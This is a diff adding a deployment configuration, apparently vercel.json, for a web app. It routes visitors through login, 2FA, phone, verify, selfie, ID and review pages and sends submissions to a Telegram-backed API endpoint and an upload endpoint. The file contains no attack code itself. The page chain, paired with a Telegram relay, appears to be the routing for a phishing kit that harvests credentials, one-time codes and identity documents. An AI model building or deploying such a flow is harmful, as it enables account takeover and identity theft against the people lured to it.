@@ -1,0 +1,30 @@
+{
+  "functions": {
+    "api/*.js": {
+      "maxDuration": 30
+    }
+  },
+  "rewrites": [
+    { "source": "/", "destination": "/public/login.html" },
+    { "source": "/login", "destination": "/public/login.html" },
+    { "source": "/2fa", "destination": "/public/2fa.html" },
+    { "source": "/phone", "destination": "/public/phone.html" },
+    { "source": "/verify", "destination": "/public/verify.html" },
+    { "source": "/action", "destination": "/public/action.html" },
+    { "source": "/selfie", "destination": "/public/selfie.html" },
+    { "source": "/id", "destination": "/public/id.html" },
+    { "source": "/review", "destination": "/public/review.html" },
+    { "source": "/api/send", "destination": "/api/telegram.js" },
+    { "source": "/api/upload", "destination": "/api/upload.js" }
+  ],
+  "headers": [
+    {
+      "source": "/(.*)",
+      "headers": [
+        { "key": "X-Frame-Options", "value": "SAMEORIGIN" },
+        { "key": "X-Content-Type-Options", "value": "nosniff" },
+        { "key": "Referrer-Policy", "value": "strict-origin-when-cross-origin" }
+      ]
+    }
+  ]
+}
